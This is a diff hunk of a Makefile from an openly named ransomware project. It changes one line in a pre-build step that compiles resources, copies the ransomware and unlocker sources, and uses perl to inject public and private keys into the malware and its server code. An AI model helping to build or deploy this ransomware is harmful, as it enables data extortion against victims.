@@ -10,7 +10,7 @@ pre-build:
 	rsrc -manifest ransomware.manifest -ico icon.ico -o build/ransomware/ransomware.syso
 	cp -r cmd/ransomware ./build
 	cp cmd/unlocker/unlocker.go ./build
-	cd build/ransomware; perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
+	cd build/ransomware && perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
 	cd build && perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' ../server/main.go
 	mkdir -p bin
 
